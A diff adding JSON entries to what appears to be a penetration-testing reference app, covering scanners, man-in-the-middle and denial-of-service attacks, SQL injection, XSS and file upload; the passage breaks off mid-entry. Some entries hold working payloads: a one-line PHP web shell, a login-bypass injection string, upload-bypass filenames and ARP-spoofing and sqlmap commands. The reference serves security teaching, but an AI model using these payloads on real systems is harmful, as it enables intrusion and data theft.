+      "Description_HTML": "<p>Netdiscover is used for scanning hosts generally over Layer 2 but generally is an active/passive scanner for networks without a DHCP server.</p> <p>Netdiscover has the following parameters:</p> <p>netdiscover [-i device] [-r range | -p] [-s time] [-n node] [-c count] [-f] [-S] A typical netdiscover command looks like the following:</p> <p>netdiscover -I eth0 -r 192.168.100.0/24</p> <p>More information: https://github.com/alexxy/netdiscover</p>"
+    },
+    {
+      "Name": "Nmap",
+      "Tags": [
+        "Network and Service Scanning",
+        "Information Gathering",
+        "Tools"
+      ],
+      "Description": "Nmap is a utility used to scan networks and hosts for open ports,services and operating systems by sending packets to selected hosts.\nNmap will scan the selected IP address (both IPv4 and IPv6 are supported, and the range of ports specified (default TCP and UDP top 1000 ports).\n\nIn order to discover hosts:\nPing Only (-sP)\nARP Ping (-PR)\nICMP Echo Request Ping (-PE)\nTCP SYN Ping (-PS)\nTCP ACK Ping (-PA)\nUDP Ping (-PU)\nIn order to discover open ports:\nTCP SYN or Stealth Scan (-sS)\nTCP Connect Scan (-sT)\nTCP ACK Scan\n UDP Scan (-sU)\nTCP FIN Scan (-sF)\nTCP NULL Scan (-sN)\nXMAS Scan Scan (-sX)\nCustom Scan (--scanflags)\nIP Protocol Scan (-sO)",
+      "Description_HTML": "<p>Nmap is a utility used to scan networks and hosts for open ports,services and operating systems by sending packets to selected hosts.</p> <p>Nmap will scan the selected IP address (both IPv4 and IPv6 are supported, and the range of ports specified (default TCP and UDP top 1000 ports).</p> <p>In order to discover hosts:</p> <p>Ping Only (-sP)</p> <p>ARP Ping (-PR)</p> <p>ICMP Echo Request Ping (-PE)</p> <p>TCP SYN Ping (-PS)</p> <p>TCP ACK Ping (-PA)</p> <p>UDP Ping (-PU)</p> <p>In order to discover open ports: TCP SYN or Stealth Scan (-sS) TCP Connect Scan (-sT)</p> <p>TCP ACK Scan</p> <p>UDP Scan (-sU)</p> <p>TCP FIN Scan (-sF)</p> <p>TCP NULL Scan (-sN)</p> <p>XMAS Scan Scan (-sX)</p> <p>Custom Scan (--scanflags)</p> <p>IP Protocol Scan (-sO)</p>"
+    },
+    {
+      "Name": "Unicornscan",
+      "Tags": [
+        "Network and Service Scanning",
+        "Information Gathering",
+        "Tools"
+      ],
+      "Description": "Unicornscan is a network stack scanner that focuses mainly on unprivilaged scanning (no root requirement).\nUnicornscan scans thousands of hosts and ports extremly fast as it operates in its own network stack.",
+      "Description_HTML": "<p>Unicornscan is a network stack scanner that focuses mainly on unprivilaged scanning (no root requirement).</p> <p>Unicornscan scans thousands of hosts and ports extremly fast as it operates in its own network stack.</p>"
+    },
+    {
+      "Name": "Nessus",
+      "Tags": [
+        "Network and Service Scanning",
+        "Information Gathering",
+        "Tools"
+      ],
+      "Description": "Nesus is an enterprise-level scanning and reporting tool.\nIt uses custom engines and scripts. It is perfect for auditing,PCI compliance tests and pen-testing.",
+      "Description_HTML": "<p>Nesus is an enterprise-level scanning and reporting tool.</p> <p>It uses custom engines and scripts. It is perfect for auditing,PCI compliance tests and pen-testing.</p>"
+    },
+    {
+      "Name": "Nexpose",
+      "Tags": [
+        "Network and Service Scanning",
+        "Information Gathering",
+        "Tools"
+      ],
+      "Description": "Nexpose monitors network exposures and threats in real-time and alerts the network administrator the moment an impact occurs.\nIt scans the network using custom engines and scripts and reports the results using the CVE database.",
+      "Description_HTML": "<p>Nexpose monitors network exposures and threats in real-time and alerts the network administrator the moment an impact occurs.</p> <p>It scans the network using custom engines and scripts and reports the results using the CVE database.</p>"
+    },
+    {
+      "Name": "Nikto",
+      "Tags": [
+        "Network and Service Scanning",
+        "Information Gathering",
+        "Tools"
+      ],
+      "Description": "An open source web server scanner. Nikto performs tests against multiple files and outdated servers.\nIt can also detect common misconfigurations such as directoryindexing and exposed CGI's.",
+      "Description_HTML": "<p>An open source web server scanner. Nikto performs tests against multiple files and outdated servers.</p> <p>It can also detect common misconfigurations such as directoryindexing and exposed CGI's.</p>"
+    },
+    {
+      "Name": "QualysGuard",
+      "Tags": [
+        "Network and Service Scanning",
+        "Information Gathering"
+      ],
+      "Description": "QualysGuard provides cloud-based and on-premise monitoring and auditing often used for daily monitoring and remidiation.\nSome features include:\nAsset discovery\nVulnerability management\nRemediationprioritization\nCompliance monitoring\nContainer security\nWeb application scanning\nFirewall and file integrity monitoring",
+      "Description_HTML": "<p>QualysGuard provides cloud-based and on-premise monitoring and auditing often used for daily monitoring and remidiation.</p> <p>Some features include:</p> <p>Asset discovery</p> <p>Vulnerability management</p> <p>Remediationprioritization</p> <p>Compliance monitoring</p> <p>Container security</p> <p>Web application scanning</p> <p>Firewall and file integrity monitoring </p>"
+    },
+    {
+      "Name": "dnsdumpster",
+      "Tags": [
+        "Network Exploitation",
+        "Tools"
+      ],
+      "Description": "DNSdumpster is a free online tool which searches a main website's domain, and lists all the subdomains that fall under it.\nIt is useful for listing hidden subdomains that are not publicly known, which might be exploitable.\nFor more info:https://dnsdumpster.com/",
+      "Description_HTML": "DNSdumpster is a free online tool which searches a main website's domain, and lists all the subdomains that fall under it.<br />It is useful for listing hidden subdomains that are not publicly known, which might be exploitable.<br />For more info:https://dnsdumpster.com/<br /><img src='images/dnsdumpster.jpg' class='img-responsive'></img><a href='https://www.safaribooksonline.com/library/view/mastering-modern-web/9781785284588/graphics/B04733_02_25.jpg'>Source</a>"
+    },
+	{
+      "Name": "Empire",
+      "Tags": [
+        "Network Exploitation",
+        "Tools"
+      ],
+      "Description": "Empire is a post-exploiotation tool designed to run PowerShell agents, and deploying common post-exploitation\nmodules ranging from key loggers to Mimikatz.\nMimikatz is commonly used to extract sensitive information from memory, but in\nconjunction with Empire, you can easily escalate privelages.\nThe current categories for Empire are:\n-Code Execution\n-Collection\n-Credentials\n-Exfiltration\n-Lateral Movement\n-Management\n-Persistence\n-Privesc\n-Recon\n-Situational Awareness\n-Trollsploit\nAll of these modules make the Post-Exploitation phase easier by putting them in one tool.\nThe components of Empire are as follows:\nListener - A component that opens a socket for the target machine to call home to the device running empire\nAgent - the exploited PC running the shell back to the device\nModules - the subtools being ran against the Agent and its network\nFor more information on installation and use of empire, please go to: https://powershellempire.com",
+      "Description_HTML": "<p>Empire is a post-exploiotation tool designed to run PowerShell agents, and deploying common post-exploitation</p><p>modules ranging from key loggers to Mimikatz.</p><p>Mimikatz is commonly used to extract sensitive information from memory, but in<p></p>conjunction with Empire, you can easily escalate privelages.</p><p>The current categories for Empire are:</p><p>-Code Execution</p><p>-Collection</p><p>-Credentials</p><p>-Exfiltration</p><p>-Lateral Movement</p><p>-Management</p><p>-Persistence</p><p>-Privesc</p><p>-Recon</p><p>-Situational Awareness</p><p>-Trollsploit</p><p>All of these modules make the Post-Exploitation phase easier by putting them in one tool.</p><p>The components of Empire are as follows:</p><p>Listener - A component that opens a socket for the target machine to call home to the device running empire</p><p>Agent - the exploited PC running the shell back to the device</p><p>Modules - the subtools being ran against the Agent and its network</p><p>For more information on installation and use of empire, please go to: https://powershellempire.com</p>"
+    },
+    {
+      "Name": "SSL Labs",
+      "Tags": [
+        "Network Exploitation",
+        "Tools"
+      ],
+      "Description": "SSL Labs is a browser tool which tests a website's SSL certificate and configuration. The website tests for:\nCertificate and configuration\nBrowser SSL implementation",
+      "Description_HTML": "SSL Labs is a browser tool which tests a website's SSL certificate and configuration. The website tests for:<br />Certificate and configuration<br />Browser SSL implementation"
+    },
+    {
+      "Name": "bettercap",
+      "Tags": [
+        "Network Exploitation",
+        "Tools"
+      ],
+      "Description": "This is a powerful yet flexible tool to perform various Man-in-the-middle attacks againsta network.\nIt can be used to manipulate HTTP,TCP and HTTPS traffic. It can also use ARP to poison and make the attacker the default gateway.\nThis will let the attacker sniff packets.\nHere is an example command: bettercap -I eth0 -S ARP -X --target [IP] --proxy -P POST",
+      "Description_HTML": "This is a powerful yet flexible tool to perform various Man-in-the-middle attacks againsta network.<br />It can be used to manipulate HTTP,TCP and HTTPS traffic. It can also use ARP to poison and make the attacker the default gateway.<br />This will let the attacker sniff packets.<br />Here is an example command: bettercap -I eth0 -S ARP -X --target [IP] --proxy -P POST<br /><img src='images/bettercap.png' class='img-responsive'></img><a href='https://www.evilsocket.net/images/2017/07/sni.png'>Source</a>"
+    },
+    {
+      "Name": "ARP Poisoning",
+      "Tags": [
+        "Network Exploitation"
+      ],
+      "Description": "ARP poisoning is a man-in-the-middle attack. The atatcker sends ARP reply messages to a device, making it send packets to it.\nThe attacker can act as a different device such as:\nDHCP server\nDNS server\nWeb server.",
+      "Description_HTML": "ARP poisoning is a man-in-the-middle attack. The atatcker sends ARP reply messages to a device, making it send packets to it.<br />The attacker can act as a different device such as:<br />DHCP server<br />DNS server<br />Web server.<br /><img src='images/arp-poisoning.png' class='img-responsive'></img><a href='http://itsecurity.telelink.com/wp-content/uploads/2013/10/Untitled1.png'>Source</a>"
+    },
+    {
+      "Name": "Rogue DHCP Server",
+      "Tags": [
+        "Network Exploitation"
+      ],
+      "Description": "A rogue DHCP server acts as a man in the middle, tricking the computer to use it as its DHCP server when sending a request.An attacker who is in between a client and another DHCP server can take over the connection and set the:\nGateway\nDNS Server\nHostnames\nNTP Server",
+      "Description_HTML": "A rogue DHCP server acts as a man in the middle, tricking the computer to use it as its DHCP server when sending a request.An attacker who is in between a client and another DHCP server can take over the connection and set the:<br />Gateway<br />DNS Server<br />Hostnames<br />NTP Server<br /><img src='images/rogue-dhcp.png' class='img-responsive'></img><a href='http://itsecurity.telelink.com/wp-content/uploads/2013/10/Untitled2.png'>Source</a>"
+    },
+    {
+      "Name": "Rogue Access Point",
+      "Tags": [
+        "Network Exploitation"
+      ],
+      "Description": "A rogue access point will trick nearby devices into connecting to it, by acting as an access point. Attackers can set-up their own devices as an access point and get close to the victim.\nBy mimicking a real AP, the victims device will connect to it thinking it's a real AP.\nThis will cause all the victims traffic to go through it, effectively making the attacker a man-in-the-middle.",
+      "Description_HTML": "A rogue access point will trick nearby devices into connecting to it, by acting as an access point. Attackers can set-up their own devices as an access point and get close to the victim.<br />By mimicking a real AP, the victims device will connect to it thinking it's a real AP.<br />This will cause all the victims traffic to go through it, effectively making the attacker a man-in-the-middle."
+    },
+    {
+      "Name": "DNS Hijacking",
+      "Tags": [
+        "Network Exploitation"
+      ],
+      "Description": "DNS Hijacking occurs when an attacker attempts to send corrupted DNS packets to a victim. The victim sends information to the attacker whenever queries are required.\nThis is effective when trying to hijack websites for phishing.",
+      "Description_HTML": "DNS Hijacking occurs when an attacker attempts to send corrupted DNS packets to a victim. The victim sends information to the attacker whenever queries are required.<br />This is effective when trying to hijack websites for phishing.<img src='images/dns-hijacking.png' class='img-responsive'></img><a href='https://3b6xlt3iddqmuq5vy2w0s5d3-wpengine.netdna-ssl.com/state-of-security/wp-content/uploads/sites/3/2_en-1024x631.png'>Source</a>"
+    },
+    {
+      "Name": "SSL Stripping",
+      "Tags": [
+        "Network Exploitation"
+      ],
+      "Description": "SSL/HTTPS is a safeguard against ARP and DNS spoofing. SSL stripping is a method for attackers to sniff packets and alter the HTTPS request. By doing so, attackers can force packets to use HTTP, removing the SSL encryption.\nOnce this is done, information is no longer encrypted and the attacker can see data in plain text.",
+      "Description_HTML": "SSL/HTTPS is a safeguard against ARP and DNS spoofing. SSL stripping is a method for attackers to sniff packets and alter the HTTPS request. By doing so, attackers can force packets to use HTTP, removing the SSL encryption.<br />Once this is done, information is no longer encrypted and the attacker can see data in plain text.<img src='images/ssl-stripping.jpg' class='img-responsive'></img><a href='https://hacktutorial.files.wordpress.com/2011/01/4.jpg'>Source</a>"
+    },
+    {
+      "Name": "Border Gateway Protocol",
+      "Tags": [
+        "Network Exploitation",
+        "Abusing Routing Infrastructure"
+      ],
+      "Description": "BGP is the foundation of internet traffic. An attacker can advertise non-existent networks. A BGP attack can block a whole country or re-routetraffic from large sections of the world.\nThere's been instances where sections of the world lost internet connection due to incorrect BGP advertisements.",
+      "Description_HTML": "BGP is the foundation of internet traffic. An attacker can advertise non-existent networks. A BGP attack can block a whole country or re-routetraffic from large sections of the world.<br />There's been instances where sections of the world lost internet connection due to incorrect BGP advertisements."
+    },
+    {
+      "Name": "Wormhole Attack",
+      "Tags": [
+        "Network Exploitation",
+        "Abusing Routing Infrastructure"
+      ],
+      "Description": "A wormhole attack is when the attacker receives packets in one location, and then tunnels them to another location in the network. This causes packets to be re-introducedin the network.\n It acts a lot like re-play networks, however in a large network scale. This is efficient against ad-hoc networks.",
+      "Description_HTML": "A wormhole attack is when the attacker receives packets in one location, and then tunnels them to another location in the network. This causes packets to be re-introducedin the network.<br /> It acts a lot like re-play networks, however in a large network scale. This is efficient against ad-hoc networks.<br /><img src='images/wormhole.jpg' class='img-responsive'></img><a href='https://i.pinimg.com/736x/4c/fd/f6/4cfdf6a2e10d8cd9a4270cd54ae5a715--manet-code-for.jpg'>Source</a>"
+    },
+    {
+      "Name": "Blackhole Attack",
+      "Tags": [
+        "Network Exploitation",
+        "Abusing Routing Infrastructure"
+      ],
+      "Description": "A node in a network advertises non existent paths, in order to hinder the path-finding process. This tactic can also be used to intercept all data packets sent to a specific node.",
+      "Description_HTML": "<p>A node in a network advertises non existent paths, in order to hinder the path-finding process. This tactic can also be used to intercept all data packets sent to a specific node.</p><img src='images/blackhole.jpg' class='img-responsive'></img><a href='https://www.researchgate.net/profile/Himadri_Saha2/publication/315727817/figure/fig5/AS:478243867369478@1491033631493/Fig-6-Co-operative-black-hole-attack-Solution-to-cooperative-Black-hole-attacks.jpg'>Source</a>"
+    },
+    {
+      "Name": "Byzantine Attack",
+      "Tags": [
+        "Network Exploitation",
+        "Abusing Routing Infrastructure"
+      ],
+      "Description": "This is a stealth network attack that focuses on a compromised intermediate not, or a set of nodes that work in collusion and carry out attacks.\nThese attacks include routing loops, creating non-optimal paths and dropping specific packets. Due to their complexity, Byyzantine attacks are hard to detect. The network might seem to be operating normal, however there could be Byzantine behavior. It can be detected due to abnormal routing.",
+      "Description_HTML": "This is a stealth network attack that focuses on a compromised intermediate not, or a set of nodes that work in collusion and carry out attacks.<br />These attacks include routing loops, creating non-optimal paths and dropping specific packets. Due to their complexity, Byyzantine attacks are hard to detect. The network might seem to be operating normal, however there could be Byzantine behavior. It can be detected due to abnormal routing.<br /><img src='images/byzantine-attack.jpg' class='img-responsive'></img><a href='http://images.slideplayer.com/23/6839695/slides/slide_21.jpg'>Source</a>"
+    },
+    {
+      "Name": "Routing Table Overflow",
+      "Tags": [
+        "Network Exploitation",
+        "Abusing Routing Infrastructure"
+      ],
+      "Description": "Routers have a table which holds all the IP addresses and paths in order to appropriately send packets. An attacking node advertises non-existent nodes, causing an overflow in existing routers.\nThis prevents new entries from being entered, therefore halting network routing and learning.",
+      "Description_HTML": "Routers have a table which holds all the IP addresses and paths in order to appropriately send packets. An attacking node advertises non-existent nodes, causing an overflow in existing routers.<br />This prevents new entries from being entered, therefore halting network routing and learning."
+    },
+    {
+      "Name": "Stale Packet Replication",
+      "Tags": [
+        "Network Exploitation",
+        "Abusing Routing Infrastructure"
+      ],
+      "Description": "An adversary nodereplicates stale packets and floods the network. This consumes bandwidth and resources available to nearby routers while also causing abnormal routing processes.",
+      "Description_HTML": "An adversary nodereplicates stale packets and floods the network. This consumes bandwidth and resources available to nearby routers while also causing abnormal routing processes."
+    },
+    {
+      "Name": "Route Cache Poisoning",
+      "Tags": [
+        "Network Exploitation",
+        "Abusing Routing Infrastructure"
+      ],
+      "Description": "This attack is most efficient to an ad-hoc network. An attacker will poison the route cache to fill it with non existent routers, congesting the network.",
+      "Description_HTML": "This attack is most efficient to an ad-hoc network. An attacker will poison the route cache to fill it with non existent routers, congesting the network."
+    },
+    {
+      "Name": "SYN Flooding",
+      "Tags": [
+        "Network Exploitation",
+        "Denial of Service"
+      ],
+      "Description": "An attacker sends a large number of SYN packets to a victim, spoofing the return address. Creates half-open connections, which creates an overflow of TCP connections. This denies any legitimate clients from connecting.",
+      "Description_HTML": "An attacker sends a large number of SYN packets to a victim, spoofing the return address. Creates half-open connections, which creates an overflow of TCP connections. This denies any legitimate clients from connecting."
+    },
+    {
+      "Name": "DNS Flooding",
+      "Tags": [
+        "Network Exploitation",
+        "Denial of Service"
+      ],
+      "Description": "This attack attempts fill up memory and CPU usage by flooding DNS UDP requests. This will block the DNS server from running since a surplus of requests are being spammed at the victim.",
+      "Description_HTML": "This attack attempts fill up memory and CPU usage by flooding DNS UDP requests. This will block the DNS server from running since a surplus of requests are being spammed at the victim."
+    },
+    {
+      "Name": "DNS Amplification",
+      "Tags": [
+        "Network Exploitation",
+        "Denial of Service"
+      ],
+      "Description": "The attacker turns initially small queries into large DNS payloads as an attempt to take down the victim's server.\nDNS amplification manipulates publicly available systems making them send queries at the target.\nThis amplifies the attack as it creates a distributed denial of service using DNS queries.",
+      "Description_HTML": "The attacker turns initially small queries into large DNS payloads as an attempt to take down the victim's server.<br />DNS amplification manipulates publicly available systems making them send queries at the target.<br />This amplifies the attack as it creates a distributed denial of service using DNS queries."
+    },
+    {
+      "Name": "HTTP Flood",
+      "Tags": [
+        "Network Exploitation",
+        "Denial of Service"
+      ],
+      "Description": "This is a distributed denial of service attack where legitimate HTTP GET or POST requests are sent to attack a web server/application. The attacker usually uses a bitnet (zombie army) which consists of connected nodes that have been taken over for the attack.\nThe owners of these zombies don't know their computers are being used for the attack.",
+      "Description_HTML": "This is a distributed denial of service attack where legitimate HTTP GET or POST requests are sent to attack a web server/application. The attacker usually uses a bitnet (zombie army) which consists of connected nodes that have been taken over for the attack.<br />The owners of these zombies don't know their computers are being used for the attack."
+    },
+    {
+      "Name": "NTP Amplification Attack",
+      "Tags": [
+        "Network Exploitation",
+        "Denial of Service"
+      ],
+      "Description": "This is a type of distributed denial of service attack in which the attacker exploits NTP servers and sends UDP traffic in an attempt to take them down.",
+      "Description_HTML": "This is a type of distributed denial of service attack in which the attacker exploits NTP servers and sends UDP traffic in an attempt to take them down."
+    },
+    {
+      "Name": "Wireless Jamming",
+      "Tags": [
+        "Network Exploitation",
+        "Denial of Service"
+      ],
+      "Description": "The attacker finds the frequency of the receiving node. The attacker then transmits signal on that frequency attempting to jam the reception.\nThe attacker can also send de-auth packets directly to the victim AP.",
+      "Description_HTML": "The attacker finds the frequency of the receiving node. The attacker then transmits signal on that frequency attempting to jam the reception.<br />The attacker can also send de-auth packets directly to the victim AP."
+    },
+	{
+      "Name": "Status Codes",
+      "Tags": [
+        "Web Exploitation",
+        "HTTP"
+      ],
+      "Description": "HTTP server response codes are as follows:\n-200: OK\n-302: Location\n-401: Unauthorized\n-403: Forbidden\n-404: Not Found\n-500: Internal Server Error",
+      "Description_HTML": "<p>HTTP server response codes are as follows: -200: OK</p> <p>-302: Location</p> <p>-401: Unauthorized -403: Forbidden</p> <p>-404: Not Found</p> <p>-500: Internal Server Error </p><img src='images/http-status-codes.jpg' class='img-responsive'></img><a href='https://media.cheatography.com/storage/thumb/kstep_http-status-codes.750.jpg?last=1467391110'>Source</a>"
+    },
+	{
+      "Name": "HTTP States and Cookies",
+      "Tags": [
+        "Web Exploitation",
+        "HTTP"
+      ],
+      "Description": "By design HTTP is stateless, therefore it cannot track data between requests in order to achieve this Web Developers implement state tracking mechanisms typically referred to as Session Identifiers.\nSession ID's are passed during HTTP requests to associate the request with a session. These requests are implemented through the following means:\n-URL\n-Hidden form fields (POST)\n-Cookie HTTP Header\nCookies are the most common place to find Session ID's in a response with a 'Set-Cookie' header, this can contain the following:\n-Domain\n-Path\n-Expires\n-Secure\n-HttpOnly",
+      "Description_HTML": "<p>By design HTTP is stateless, therefore it cannot track data between requests in order to achieve this Web Developers implement state tracking mechanisms typically referred to as Session Identifiers.</p> <p>Session ID's are passed during HTTP requests to associate the request with a session. These requests are implemented through the following means: -URL</p> <p>-Hidden form fields (POST)</p> <p>-Cookie HTTP Header</p> <p>Cookies are the most common place to find Session ID's in a response with a 'Set-Cookie' header, this can contain the following: -Domain</p> <p>-Path</p> <p>-Expires</p> <p>-Secure</p> <p>-HttpOnly</p>"
+    },
+	{
+      "Name": "HTTP Session Hijacking",
+      "Tags": [
+        "Web Exploitation",
+        "HTTP"
+      ],
+      "Description": "HTTP Session Hijacking is a method used to steal a legitimate users session during transit. HTTPS must be forced down to HTTP as otherwise the attacker will be unable to view the communication between client and server.\nUpon the target visiting a login page the attacker can sniff the session cookie being sent to the target after a successful login authentication, alternatively this would be an excellent time to capture usernames and passwords if in plaintext.",
+      "Description_HTML": "<p>HTTP Session Hijacking is a method used to steal a legitimate users session during transit. HTTPS must be forced down to HTTP as otherwise the attacker will be unable to view the communication between client and server.</p> <p>Upon the target visiting a login page the attacker can sniff the session cookie being sent to the target after a successful login authentication, alternatively this would be an excellent time to capture usernames and passwords if in plaintext.</p><img src='images/session-hijacking.jpg' class='img-responsive'></img><a href='https://www.owasp.org/images/c/cb/Session_Hijacking_3.JPG'>Source</a>"
+    },
+	{
+      "Name": "HTTP Strict Transport Security",
+      "Tags": [
+        "Web Exploitation",
+        "HTTP"
+      ],
+      "Description": "HTTP Headers are often combined with certificate pinning which will force the browser to remember a TLS certificate and therefore force the browser to only communicate over HTTPS.\nIf HTTPS is constantly on the attacker must break SSL.",
+      "Description_HTML": "<p>HTTP Headers are often combined with certificate pinning which will force the browser to remember a TLS certificate and therefore force the browser to only communicate over HTTPS.</p> <p>If HTTPS is constantly on the attacker must break SSL.</p>"
+    },
+	{
+      "Name": "SQL Injection",
+      "Tags": [
+        "Web Exploitation",
+        "Injection"
+      ],
+      "Description": "SQL Injection is an extremely common web exploitation as companies fail to treat data sent to their applications with scrutiny. This allows for attackers to play around and use a companies servers against them through commonly form input data disguised as a legitimate user request or POST.\nSQL Injection can result in the loss of data, corruption, lack of accountability, and denial of access.\nThere are 3 types of SQL injection types:\n1. In-band ('Error-based') used for finding and exploiting\n2. Out-of-band ('Union-Based') used for extraction of data\n3. Inferential ('Blind') noisy and time-consuming\n\nSQL queries through web apps can look like the following:\nSELECT id, name FROM users\nWHERE name ='username'\nAND password = 'password' ;\n NOTE: Proper implementations will used hashed passwords and may cause complications when SQL injecting in the password fields.\n\n In order to inject these queries we can add things like a tick operator (') and include any SQL code we want to execute after for successful matching of usernames we would do the following:\n username = name' OR '1'=1\n This query if not protected would resolve as true every single time.",
+      "Description_HTML": "<p>SQL Injection is an extremely common web exploitation as companies fail to treat data sent to their applications with scrutiny. This allows for attackers to play around and use a companies servers against them through commonly form input data disguised as a legitimate user request or POST.</p> <p>SQL Injection can result in the loss of data, corruption, lack of accountability, and denial of access.</p> <p>There are 3 types of SQL injection types:</p> <p>1. In-band ('Error-based') used for finding and exploiting</p> <p>2. Out-of-band ('Union-Based') used for extraction of data</p> <p>3. Inferential ('Blind') noisy and time-consuming</p> <p>SQL queries through web apps can look like the following:</p> <p>SELECT id, name FROM users</p> <p>WHERE name ='username'</p> <p>AND password = 'password' ;</p> <p>NOTE: Proper implementations will used hashed passwords and may cause complications when SQL injecting in the password fields.</p> <p>In order to inject these queries we can add things like a tick operator (') and include any SQL code we want to execute after for successful matching of usernames we would do the following: username = name' OR '1'=1</p> <p>This query if not protected would resolve as true every single time.</p><img src='images/sql-injection.jpg' class='img-responsive'></img><a href='https://img.wonderhowto.com/img/82/37/63467143404620/0/essential-newbies-guide-sql-injections-and-manipulating-data-mysql-database.w1456.jpg'>Source</a>"
+    },
+	{
+      "Name": "SQLMap",
+      "Tags": [
+        "Web Exploitation",
+        "Injection",
+		"SQL Tools"
+      ],
+      "Description": "SQLMap is a tool used to automate the process of detecting SQL injection vulnerabilities. Including a detection engine and database fingerprinting from data fetching from the database, along with accessing the underlying file system and executing OS commands via out-of-band connections.\nSQLmap takes the following parameters: SQLMap [-h] [--h] [-u] [-g] [--data] [--cookie] [--random-agent] [--proxy] [-tor] [-check-tor] [-a] [-b] [--passwords] plus many more.\nA typical SQLMap command looks like the following:\nsqlmap -u 'http://www.site.com/section.php?id=51'\nsqlmap -u 'http://www.site.com/section.php?id=51' --dbs\nsqlmap -u 'http://www.site.com/section.php?id=51' --columns -D safecosmetics -T users\nMore information: https://tools.kali.org/vulnerability-analysis/sqlmap",
+      "Description_HTML": "<p>SQLMap is a tool used to automate the process of detecting SQL injection vulnerabilities. Including a detection engine and database fingerprinting from data fetching from the database, along with accessing the underlying file system and executing OS commands via out-of-band connections.</p> <p>SQLmap takes the following parameters: SQLMap [-h] [--h] [-u] [-g] [--data] [--cookie] [--random-agent] [--proxy] [-tor] [-check-tor] [-a] [-b] [--passwords] plus many more.</p> <p>A typical SQLMap command looks like the following:</p> <p>sqlmap -u 'http://www.site.com/section.php?id=51'</p> <p>sqlmap -u 'http://www.site.com/section.php?id=51' --dbs</p> <p>sqlmap -u 'http://www.site.com/section.php?id=51' --columns -D safecosmetics -T users</p> <p>More information: https://tools.kali.org/vulnerability-analysis/sqlmap</p>"
+    },
+	{
+      "Name": "Cross Site Scripting",
+      "Tags": [
+        "Web Exploitation",
+        "XSS"
+      ],
+      "Description": "Cross Site Scripting are attacks targeted at the users browsers interpreters, the vectors for this attack are limitless as it exploits stored data anywhere.\nXSS flaws are found fairly easily through analyzingthe code, however the impact it can have on users and infrastructure if fairly significant.\nFrom hijacking web pages to injecting XSS into databases for users to view in comment sections on threads injecting Javascript or using page code interpreters is a great way to XSS.",
+      "Description_HTML": "<p>Cross Site Scripting are attacks targeted at the users browsers interpreters, the vectors for this attack are limitless as it exploits stored data anywhere.</p> <p>XSS flaws are found fairly easily through analyzingthe code, however the impact it can have on users and infrastructure if fairly significant.</p> <p>From hijacking web pages to injecting XSS into databases for users to view in comment sections on threads injecting Javascript or using page code interpreters is a great way to XSS.</p>"
+    },
+	{
+      "Name": "Stored XSS",
+      "Tags": [
+        "Web Exploitation",
+        "XSS"
+      ],
+      "Description": "Stored XSS is used to inject XSS scripts into some infrastructure medium like a database for example. Upon the XSS script being stored in the database when a regular user requests the page that the XSS script is stored on the code will be executed.",
+      "Description_HTML": "<p>Stored XSS is used to inject XSS scripts into some infrastructure medium like a database for example. Upon the XSS script being stored in the database when a regular user requests the page that the XSS script is stored on the code will be executed.</p>"
+    },
+	{
+      "Name": "Reflected XSS",
+      "Tags": [
+        "Web Exploitation",
+        "XSS"
+      ],
+      "Description": "Reflected XSS uses one malicious page with XSS code on it to access a completely different website however accessing on the behalf of the victim and now the victim thinks the XSS script is from the target website and now the attacker can do whatever they want to the victims account.",
+      "Description_HTML": "<p>Reflected XSS uses one malicious page with XSS code on it to access a completely different website however accessing on the behalf of the victim and now the victim thinks the XSS script is from the target website and now the attacker can do whatever they want to the victims account.</p>"
+    },
+	{
+      "Name": "Web Shells",
+      "Tags": [
+        "Web Exploitation",
+        "File Upload"
+      ],
+      "Description": "Uploading malicious files to web servers that contain shells, such as a PHP script. For example, this can be done where a user profile picture is uploaded, then delivered and executed to the user to show the profile picture. We can then upload webshells to the server allowing us as much access if not more than the application running the operations themselves.\nA simple PHP file such as: <?php system($_GET['cmd']); ?>\nWould allow us to execute CMD commands by appending ?cmd=command to the URL of the page vulnerable.",
+      "Description_HTML": "<p>Uploading malicious files to web servers that contain shells, such as a PHP script. For example, this can be done where a user profile picture is uploaded, then delivered and executed to the user to show the profile picture. We can then upload webshells to the server allowing us as much access if not more than the application running the operations themselves.</p> <p>A simple PHP file such as: <?php system($_GET['cmd']); ?></p> <p>Would allow us to execute CMD commands by appending ?cmd=command to the URL of the page vulnerable.</p>"
+    },
+	{
+      "Name": "Bypass Upload Restrictions",
+      "Tags": [
+        "Web Exploitation",
+        "File Upload"
+      ],
+      "Description": "Bypassing upload restrictions can be done in many ways. Here are a few techniques:\nDual Extensions: shell.jpg.php\nNull byte attack: shell.php%00.jpg\nInserting malicious code into the metadata\nCreating a file with the correct JPG header and unrenderable content that includes PHP code\nUse legacy extensions like php3",
+      "Description_HTML": "<p>Bypassing upload restrictions can be done in many ways. Here are a few techniques: Dual Extensions: shell.jpg.php</p> <p>Null byte attack: shell.php%00.jpg</p> <p>Inserting malicious code into the metadata</p> <p>Creating a file with the correct JPG header and unrenderable content that includes PHP code Use legacy extensions like php3</p>"
+    },
+	{
+      "Name": "PHP Shells",
+      "Tags": [
+        "Web Exploitation",
+        "File Upload",
+		"Common Web Shells"
+      ],
+      "Description": "Common Web Shells include:\n-C99.php\n-R57.php\n-Weevley: https://github.com/epinna/weevely3 \n-Others: https://github.com/JohnTroony/php-webshells \nNOTE: Often these web shells themselves will have backdoors for the creators/re-uploaders so use these shells with caution.",
+      "Description_HTML": "<p>Common Web Shells include:</p> <p>-C99.php</p> <p>-R57.php</p> <p>-Weevley: https://github.com/epinna/weevely3 -Others: https://github.com/JohnTroony/php-webshells NOTE: Often these web shells themselves will have backdoors for the creators/re-uploaders so use these shells with caution.</p>"
+    },
+	{
+      "Name": "File Inclusion Vulnerabilities",
+      "Tags": [
+        "Web Exploitation",
+        "File Inclusion"
+      ],
+      "Description": "File Inclusion Vulnerabilities allow for attackers to include files into a web page, this is done by targeting 'dynamic file inclusion' mechanisms implemented in targeted applications.\nThis vulnerability occurs when user-supplied input is provided without proper validation.\nThis can lead to:\n-Code execution on the web server\n-Code execution on the client-side such as Javascript which can lead to other attacks such as XSS\n-Denial of Service\n-Sensitive Information Disclosure.",
+      "Description_HTML": "<p>File Inclusion Vulnerabilities allow for attackers to include files into a web page, this is done by targeting 'dynamic file inclusion' mechanisms implemented in targeted applications.</p> <p>This vulnerability occurs when user-supplied input is provided without proper validation.</p> <p>This can lead to:</p> <p>-Code execution on the web server</p> <p>-Code execution on the client-side such as Javascript which can lead to other attacks such as XSS -Denial of Service</p> <p>-Sensitive Information Disclosure.</p>"
+    },
+	{
+      "Name": "Local File Inclusion",
+      "Tags": [
+        "Web Exploitation",
+        "File Inclusion"
+      ],
